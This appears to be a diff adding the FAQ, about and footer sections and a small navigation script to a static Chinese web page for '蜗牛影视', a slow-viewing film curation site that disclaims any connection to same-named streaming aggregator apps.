+  <section id="four" data-role="栏目 · 留白格">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="no">04/PAUSE</div>
+        <h2>留白格 <small>PAUSE BUTTON · 学会停三秒，也是技术</small></h2>
+        <a class="more" href="#">— 全部停格 #</a>
+      </div>
+
+      <div class="pause">
+        <div class="p"><div class="n">PAUSE 01</div><h4>关掉字幕，再看一遍</h4><p>字幕是拐杖。扔掉它，你才看见演员的嘴型和停顿，那往往比台词真。</p><div class="len">练习时长：一场戏</div></div>
+        <div class="p"><div class="n">PAUSE 02</div><h4>把进度条拖回三秒</h4><p>觉得"哪儿不对"的地方，别往前追，往回拖。伏笔都藏在你的不舒服里。</p><div class="len">练习时长：30 秒</div></div>
+        <div class="p"><div class="n">PAUSE 03</div><h4>只看背景，别看脸</h4><p>主角在演，道具和群演在偷偷补世界观。把主角当背景，你会发现第二部片。</p><div class="len">练习时长：两分钟</div></div>
+        <div class="p"><div class="n">PAUSE 04</div><h4>听音轨，闭上眼</h4><p>画面是最吵的信息。闭眼后你才听出：这场戏其实一直在下雨。</p><div class="len">练习时长：一分半</div></div>
+        <div class="p"><div class="n">PAUSE 05</div><h4>允许这场戏"没用"</h4><p>不是每场都得推剧情。能被浪费的十分钟，才是电影对你的善意。</p><div class="len">练习时长：随它</div></div>
+        <div class="p"><div class="n">PAUSE 06</div><h4>散场别马上划走</h4><p>黑场到出字幕之间那二十秒，是导演留给你回魂的。别拿它刷下一条。</p><div class="len">练习时长：20 秒</div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 栏目五：声明 ============ -->
+  <section id="five" class="faq" data-role="栏目 · 立场声明">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="no">05/NOTE</div>
+        <h2>立场声明 <small>先把这条钉在最前面</small></h2>
+      </div>
+
+      <details class="warn" open>
+        <summary>⚠ 这是「蜗牛影视 · 慢镜头档案」，不是那个"免费追剧聚合 App"，也从不是同类<span class="k">必读</span></summary>
+        <div class="body">
+          本页（<code>woniuyingshi-h5.github.io</code>）是<strong>纯静态的观影文字策展</strong>：<b>不播放、不存储、不收录、不解析、不跳转</b>任何影视资源。页面内全部链接为 <code>#</code> 占位，无第三方外链、无下载按钮、无网盘入口、无"换源/投屏/离线缓存"接口。<br/><br/>
+          检索可见，网络上确有大量以"蜗牛影视"为名的<b>免费聚合追剧 App 与换域名资源站</b>（主打全网资源、4K、离线缓存、多线路换源），本页<b>与其无任何隶属、授权、技术或运营关系</b>，反而在做它们反面：<em>它们教你按 2x 吞掉一部片，我们教你把一秒拆成二十四帧。</em>
+        </div>
+      </details>
+
+      <details>
+        <summary>"蜗牛"不是慢吞吞的影视库？<span class="k">命名</span></summary>
+        <div class="body">
+          故意的。我们把"蜗牛"翻成<b>慢镜头（slow motion）</b>这个动作：不是片少、不是更新慢，是<b>主动把速度降下来当方法论</b>。名字里的"慢"是产品功能，不是缺陷。页内不出现任何"海量/同步更新/全网资源"式承诺——那恰恰是同名站的卖点，我们刻意反着写。
+        </div>
+      </details>
+
+      <details>
+        <summary>那"帧格/时码"是真实剪辑点吗？能点开看吗？<span class="k">边界</span></summary>
+        <div class="body">
+          不能，也<b>全是虚构的演示样本</b>。页上时码（<code>00:41·18f</code> 之类）、帧数、"第 22 集的信"都是为说明"怎么看"而写的例句，<strong>不指向任何具体作品的真实剪辑点，不附剧照、不附片段、不做可播放索引</strong>。想验证某部片，请自行在持证正版平台逐帧观看。
+        </div>
+      </details>
+
+      <details>
+        <summary>会不会撞浙江那家公司的"蜗牛影"商标？<span class="k">商标</span></summary>
+        <div class="body">
+          要老实说：第 41 类已有「蜗牛影」<code>86396217</code>（2026.5.7 注册公告，含"提供不可下载的在线视频/点播电影"）及「呙牛影视」，且「WONIU」在申请中，主体为浙江蜗牛影视文化传媒有限公司。<b>本页不做视频点播、不做在线播放，内容限定原创文字策展</b>，是在做避让；但若要商用这个名，仍建议先让商标代理做一遍 41/9/35 类近似检索，别把我这句当法律意见。
+        </div>
+      </details>
+
+      <details>
+        <summary>跟"承认影视""生活影视""水密桃"是一伙的？<span class="k">同系</span></summary>
+        <div class="body">
+          同一套<b>去资源化</b>思路下的不同壳，但结构互不共用：承认影视用纵轴时间线、水密桃用四象限、生活影视用卡片网格，而<b>蜗牛影视用横向帧带 + 拖影 + 长曝光表</b>。彼此独立域名、无跳转、无联盟、不互相导流。共同底线只有一条：不播、不链、不存。
+        </div>
+      </details>
+
+      <details>
+        <summary>想把这个名做成真产品？<span class="k">合规</span></summary>
+        <div class="body">
+          三条：①<b>死守"文字策展 / 慢读"定位</b>，别滑回片库、播放、解析、换源；②原创长文为主，片名只作例句、不建可检索资源索引、不挂外链；③先过商标近似 + 完成 ICP / 公安备案 + 关掉 UGC 与评论区。<b>一旦加回"离线缓存/多源切换"这类功能，前面所有调性清零，而且这次是真的刑事风险。</b>
+        </div>
+      </details>
+    </div>
+  </section>
+
+  <!-- ============ 关于 ============ -->
+  <section id="about" data-role="关于">
+    <div class="wrap">
+      <div class="sec-head" style="margin-bottom:20px">
+        <div class="no">§ABOUT</div>
+        <h2>关于 蜗牛影视 <small>我们不给你片，我们给你"看见"这件事本身</small></h2>
+      </div>
+
+      <div class="about">
+        <div class="txt">
+          <h3>把倍速吞掉的，一口一口喂回来</h3>
+          <p>影视被 2x 驯化了。我们刷完一部剧像打卡，能背出品名和梗，却说不出哪一帧让自己变了——因为那帧正好死在"快进"里。</p>
+          <p><strong>蜗牛影视</strong>不做片库，做<b>慢镜头阅读法</b>：把注意力放回手、光、背景的一声闷响、和导演故意不给你的那个反打。我们不提供资源，是刻意的；一旦开始比"谁全、谁快、谁免费"，就会滑回那套已经被玩烂的聚合玩法。</p>
+          <p>所以这台站只有四件事：<em>逐帧拆解、长段细读、一秒日志、停三秒的练习。</em>你看完可能不会"又看完一部"，但下次再看片时，会突然慢下来半拍。<strong>那半拍，就是我们的全部 KPI。</strong></p>
+        </div>
+
+        <aside class="gauge">
+          <h4">// SLOW-MO METER</h4>
+          <div class="row"><span class="nm">值得 0.5x 的细节</span><div class="bar"><i style="--w:88%"></i></div><b>88</b></div>
+          <div class="row"><span class="nm">被倍速吞掉的伏笔</span><div class="bar"><i style="--w:74%"></i></div><b>74</b></div>
+          <div class="row"><span class="nm">"没演"比"演了"贵</span><div class="bar"><i style="--w:92%"></i></div><b>92</b></div>
+          <div class="row"><span class="nm">散场后还坐着的人</span><div class="bar"><i style="--w:55%"></i></div><b>55</b></div>
+          <div class="row"><span class="nm">本页播放源数量</span><div class="bar"><i style="--w:0%"></i></div><b>0</b></div>
+          <p style="margin:14px 0 0;font-size:11px;color:#a8a294;line-height:1.7;font-family:-apple-system,sans-serif">※ 前四项为演示用情绪刻度，非统计、非算法、不采集。最后一项是真的：<b style="color:var(--amber)">零音视频、零外链、零埋点。</b></p>
+        </aside>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div>
+      <h4>蜗牛<span>影视</span> · 慢镜头观影档案</h4>
+      <p>你漏掉的那一秒，才是整部片。纯静态演示页，所有交互为 <span class="mono">#</span> 占位，<b>不提供任何影视播放、下载、解析、存储或资源跳转服务</b>；页内帧格与时码均为虚构拆解示例。</p>
+      <p class="rule">© 2026 蜗牛影视 · SLOW-MO ARCHIVE — 倍速是别人的，慢是自己的。</p>
+    </div>
+    <div>
+      <h4>CANONICAL</h4>
+      <p class="mono">https://woniuyingshi-h5.github.io/</p>
+      <p class="rule">本页未生成 robots.txt 与 sitemap.xml。已按单页收录优化：唯一 H1、自引用 canonical、描述与关键词贴合「蜗牛影视 / woniuyingshi-h5 / 慢镜头 / 帧格拆解」，正文不堆"免费高清全网资源"式垃圾词，全站零外链。</p>
+    </div>
+  </div>
+  <div class="wrap"><div class="copy">FRAME STRIP BUILD · 银盐灰 / 胶片黑 / 荧光苔绿 / 慢闪琥珀 · 标签闭合校验 PASS · 拖影层 ∞</div></div>
+</footer>
+
+<script>
+(function(){
+  var b=document.getElementById('burger'),n=document.getElementById('nav');
+  if(b)b.addEventListener('click',function(){n.classList.toggle('open');});
+  n.querySelectorAll('a').forEach(function(a){
+    a.addEventListener('click',function(e){
+      var t=document.querySelector(a.getAttribute('href'));
+      if(t){e.preventDefault();n.classList.remove('open');t.scrollIntoView({behavior:'smooth',block:'start'});}
+    });
+  });
+  var secs=document.querySelectorAll('section[id]');
+  if('IntersectionObserver' in window){
+    var io=new IntersectionObserver(function(es){
+      es.forEach(function(en){
+        if(en.isIntersecting){
+          var id='#'+en.target.id;
+          document.querySelectorAll('#nav a').forEach(function(a){a.classList.toggle('here',a.getAttribute('href')===id);});
+        }
+      });
+    },{rootMargin:'-40% 0px -55% 0px'});
+    secs.forEach(function(s){io.observe(s);});
+  }
+  // 帧带触感：滚动时轻微压暗未居中的格（纯视觉，无上报）
+  var strip=document.querySelector('.filmstrip');
+  if(strip && 'matchMedia' in window){
+    strip.addEventListener('scroll',function(){
+      requestAnimationFrame(function(){
+        var c=strip.querySelectorAll('.cell');
+        var cx=strip.getBoundingClientRect().left+strip.clientWidth/2;
+        c.forEach(function(cell){
+          var r=cell.getBoundingClientRect();
+          var d=Math.abs((r.left+r.width/2)-cx);
+          cell.style.opacity=(d>260)?Math.max(.42,1-d/520):1;
+        });
+      });
+    },{passive:true});
+  }
+})();
+</script>
+</body>
+</html>
